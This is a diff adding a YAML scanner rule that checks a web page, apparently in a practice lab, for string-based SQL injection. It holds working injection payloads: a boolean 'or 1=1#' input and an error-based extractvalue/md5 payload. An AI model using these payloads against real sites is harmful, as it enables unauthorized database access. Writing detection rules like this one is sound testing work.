@@ -1,0 +1,19 @@
+name: sqli_str
+rules:
+  - method: GET
+    path: /sqli/sqli_str.php
+    follow_redirects: false
+    body: name=kobe%27+or+1%3D1%23&submit=查询
+    expression: response.status==200 && lengthDiff && sqli_str
+  - method: GET
+    path: sqli_str.php
+    follow_redirects: false
+    body: name=1&submit=查询
+    expression: response.status==200 && lengthDiff && sqli_str
+detail:
+  type: sqldet
+  paramkey: name
+  payload: admin'and/**/extractvalue(1,concat(char(126),md5(1012874874)))and'
+
+
+
